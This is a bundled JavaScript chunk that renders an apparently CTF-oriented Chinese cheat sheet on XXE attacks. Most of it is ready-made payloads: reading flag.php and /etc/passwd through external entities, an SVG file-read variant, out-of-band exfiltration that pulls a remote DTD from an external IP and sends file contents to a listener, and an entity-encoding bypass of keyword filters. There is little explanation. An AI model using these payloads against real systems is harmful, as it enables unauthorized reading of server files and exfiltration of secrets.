(window.webpackJsonp=window.webpackJsonp||[]).push([[49],{808:function(s,e,a){"use strict";a.r(e);var n=a(103),t=Object(n.a)({},(function(){var s=this,e=s.$createElement,a=s._self._c||e;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"xxe"}},[s._v("XXE "),a("a",{staticClass:"header-anchor",attrs:{href:"#xxe"}},[s._v("#")])]),s._v(" "),a("p",[s._v("XXE （ PHP 5.45之后不解析实体 ）")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('<!DOCTYPE 根标签名 SYSTEM "文件名">\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("DTD实体是用于定义引用文本或字符的快捷方式的变量，可内部声明或外部引用。")]),s._v(" "),a("p",[s._v("约束通过类别关键词 ANY 声明的元素，可包含任何可解析数据的组合：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("<!ELEMENT 标签名 ANY>\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("同时xxe可进行内网探测读取 /etc/hosts")]),s._v(" "),a("h2",{attrs:{id:"payload"}},[s._v("Payload "),a("a",{staticClass:"header-anchor",attrs:{href:"#payload"}},[s._v("#")])]),s._v(" "),a("p",[s._v("PHP文件读取")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('<?xml version="1.0" encoding="utf-8"?> \n<!DOCTYPE xxe [\n<!ELEMENT name ANY>\n<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php">]>\n<creds>\n<user>&xxe;</user>\n</creds>\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("p",[s._v("file协议读取文件")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('<?xml version="1.0"?>\n<!DOCTYPE GVI [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>\n<catalog>\n    \t<core id="test101">\n     \t\t<description>&xxe;</description>\n  \t\t</core>\n</catalog>\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("p",[s._v("SVG格式")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE note [\n<!ENTITY file SYSTEM "要读取的文件路径" >\n]>\n<svg height="100" width="1000">\n  \t\t<text x="10" y="20">&file;</text>\n</svg>\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("p",[s._v("数据外带")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('<!DOCTYPE root [ \n<!ENTITY % remote SYSTEM "http://174.1.66.167/shell.dtd">\n%remote;\n]>\n\nshell.dtd\n<!ENTITY % file SYSTEM "file:///flag">\n<!ENTITY % int "<!ENTITY &#37; send SYSTEM \'http://127.0.0.1:5555/?flag=%file;\'>">\n%int;\n%send;\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br")])]),a("p",[s._v("xxe绕过的payload")]),s._v(" "),a("p",[s._v("当只过滤了SYSTEM，PUBLIC等关键字时，可用双重实体编码绕过")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('<?xml version="1.0"?>\n\n<!DOCTYPE GVI [\n\n    <!ENTITY % xml "&#60;&#33;&#69;&#78;&#84;&#73;&#84;&#89;&#32;&#120;&#120;&#101;&#32;&#83;&#89;&#83;&#84;&#69;&#77;&#32;&#34;&#102;&#105;&#108;&#101;&#58;&#47;&#47;&#47;&#102;&#108;&#97;&#103;&#46;&#116;&#120;&#116;&#34;&#32;&#62;&#93;&#62;&#10;&#60;&#99;&#111;&#114;&#101;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#109;&#101;&#115;&#115;&#97;&#103;&#101;&#62;&#38;&#120;&#120;&#101;&#59;&#60;&#47;&#109;&#101;&#115;&#115;&#97;&#103;&#101;&#62;&#10;&#60;&#47;&#99;&#111;&#114;&#101;&#62;">\n\n    %xml;\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("p",[s._v("即为在xml实体中再定义一次xml，可成功被解析，支持dtd数据外带")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('<!ENTITY xxe SYSTEM "file:///flag.txt" >]>\n<core>\n      <message>&xxe;</message>\n</core>\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("以上为编码部分内容")])])}),[],!1,null,null,null);e.default=t.exports}}]);